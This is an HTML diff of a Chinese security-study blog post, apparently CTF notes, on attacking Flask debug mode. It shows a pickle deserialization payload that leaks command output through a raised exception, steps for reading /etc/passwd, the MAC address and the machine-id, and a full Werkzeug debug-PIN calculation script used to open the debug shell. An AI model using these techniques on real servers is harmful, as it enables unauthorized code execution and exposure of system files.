@@ -19,21 +19,24 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="bottle模板注入以及内存马bottle内存马‘">
+    <meta name="description" content="通过报错回显当可以命令执行，但是无回显且机器不出网时，可以通过报错回显。以一个pickle反序列化的题目为例 12345class Email():email &#x3D; &quot;admin@admin.com&quot;def __reduce__(self):    return (exec,(&quot;raise Exception(__import__(&#x27;os&#x27;).pop">
 <meta property="og:type" content="article">
-<meta property="og:title" content="mekrina">
-<meta property="og:url" content="http://mekrina.github.io/blogs/uncategorized/%E5%BE%85%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%96%87%E7%AB%A0/index.html">
+<meta property="og:title" content="flask debug模式">
+<meta property="og:url" content="http://mekrina.github.io/blogs/flask/flask-debug%E6%A8%A1%E5%BC%8F/index.html">
 <meta property="og:site_name" content="mekrina">
-<meta property="og:description" content="bottle模板注入以及内存马bottle内存马‘">
+<meta property="og:description" content="通过报错回显当可以命令执行，但是无回显且机器不出网时，可以通过报错回显。以一个pickle反序列化的题目为例 12345class Email():email &#x3D; &quot;admin@admin.com&quot;def __reduce__(self):    return (exec,(&quot;raise Exception(__import__(&#x27;os&#x27;).pop">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-03-11T14:00:57.733Z">
-<meta property="article:modified_time" content="2025-03-11T14:04:37.641Z">
+<meta property="og:image" content="http://mekrina.github.io/blogs/images/flask_debug_mode1.png">
+<meta property="og:image" content="http://mekrina.github.io/blogs/images/flask_debug_mode2.png">
+<meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
+<meta property="article:modified_time" content="2025-03-11T13:54:07.968Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://mekrina.github.io/blogs/images/flask_debug_mode1.png">
   
   
   
-  <title>mekrina</title>
+  <title>flask debug模式 - mekrina</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text=""></span>
+            <span id="subtitle" data-typed-text="flask debug模式"></span>
           
         </div>
 
@@ -210,8 +213,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-03-11 22:00" pubdate>
-          2025年3月11日 晚上
+        <time datetime="2025-01-20 21:06" pubdate>
+          2025年1月20日 晚上
         </time>
       </span>
     
@@ -222,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          13 字
+          439 字
         
       </span>
     
@@ -233,7 +236,7 @@
         
         
         
-          1 分钟
+          4 分钟
         
       </span>
     
@@ -270,12 +273,30 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header"></h1>
+            <h1 id="seo-header">flask debug模式</h1>
             
             
               <div class="markdown-body">
                 
-                <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16942">bottle模板注入以及内存马</a><br><a target="_blank" rel="noopener" href="https://forum.butian.net/share/4048">bottle内存马</a>‘</p>
+                <h2 id="通过报错回显"><a href="#通过报错回显" class="headerlink" title="通过报错回显"></a>通过报错回显</h2><p>当可以命令执行，但是无回显且机器不出网时，可以通过报错回显。以一个pickle反序列化的题目为例</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Email</span>():<br>email = <span class="hljs-string">&quot;admin@admin.com&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read())&quot;</span>,))<br></code></pre></td></tr></table></figure>
+<p>python中exec相当于php的eval，可以用于在当前进程中执行python代码。<br>这里主动抛出错误，错误内容是要获取的值，从而在报错信息中得到flag</p>
+<h2 id="计算pin码进行RCE"><a href="#计算pin码进行RCE" class="headerlink" title="计算pin码进行RCE"></a>计算pin码进行RCE</h2><ol>
+<li>服务器运行flask所登录的用户名。 通过读取&#x2F;etc&#x2F;passwd获得</li>
+<li>module name 一般不变就是flask.app</li>
+<li>getattr(app, “name”, app.class.name)。python该值一般为Flask值一般不变</li>
+<li>flask库下app.py的绝对路径。通过报错信息就会泄露该值。</li>
+<li>mac地址的十进制数。通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address获得</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;1e:eb:d7:36:97:1e&#x27;</span>));<br></code></pre></td></tr></table></figure>
+<ol start="6">
+<li>机器的id。<br> linux<br> &#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i<br> docker<br> &#x2F;proc&#x2F;self&#x2F;cgroup：</li>
+</ol>
+<p>pin码计算脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br> <br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span>  <span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br> <br>private_bits = [<br>    <span class="hljs-string">&#x27;170380142167213&#x27;</span>,  <span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>    <span class="hljs-string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>  <span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br> <br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure>
+
+<p>得到pin码之后在报错页面<br><img src="/blogs/images/flask_debug_mode1.png" srcset="/blogs/img/loading.gif" lazyload alt="报错页面"><br>点击shell图标(当鼠标浮于任何一行文字时会出现)<br>输入pin码</p>
+<p>得到shell<br><img src="/blogs/images/flask_debug_mode2.png" srcset="/blogs/img/loading.gif" lazyload alt="shell"><br>最好用os.popen</p>
 
                 
               </div>
@@ -283,6 +304,27 @@
             <hr/>
             <div>
               <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/blogs/categories/flask/" class="category-chain-item">flask</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
   
   
 </div>
@@ -293,8 +335,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div></div>
-      <div>http://mekrina.github.io/blogs/uncategorized/待学习的文章/</div>
+      <div>flask debug模式</div>
+      <div>http://mekrina.github.io/blogs/flask/flask-debug模式/</div>
     </div>
     <div class="license-meta">
       
@@ -306,7 +348,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年3月11日</div>
+          <div>2025年1月20日</div>
         </div>
       
       
@@ -338,9 +380,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blogs/windows/misc/vscode%E8%B0%83%E8%AF%95thinkphp%E9%A1%B9%E7%9B%AE/" title="vscode调试thinkphp项目">
+                      <a href="/blogs/SSTI/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/" title="SSTI模版注入">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">vscode调试thinkphp项目</span>
+                        <span class="hidden-mobile">SSTI模版注入</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -348,8 +390,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/blogs/uncategorized/linux%E6%8F%90%E6%9D%83/" title="">
-                        <span class="hidden-mobile"></span>
+                      <a href="/blogs/uncategorized/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" title="http请求走私">
+                        <span class="hidden-mobile">http请求走私</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
